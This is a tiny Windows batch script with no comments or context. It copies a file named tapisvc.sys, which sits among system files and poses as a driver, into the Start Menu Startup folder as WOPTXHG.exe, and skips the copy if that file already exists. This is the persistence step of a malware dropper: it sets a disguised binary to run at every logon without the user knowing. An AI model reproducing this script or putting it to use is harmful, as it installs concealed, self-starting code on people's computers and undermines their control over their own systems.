@echo off

:s
@if exist "C:\WINDOWS\WOPTXHG.exe" goto f
@copy "C:\WINDOWS\SYSTEM\tapisvc.sys" "C:\WINDOWS\Start Menu\Programs\Startup\WOPTXHG.exe"
:f
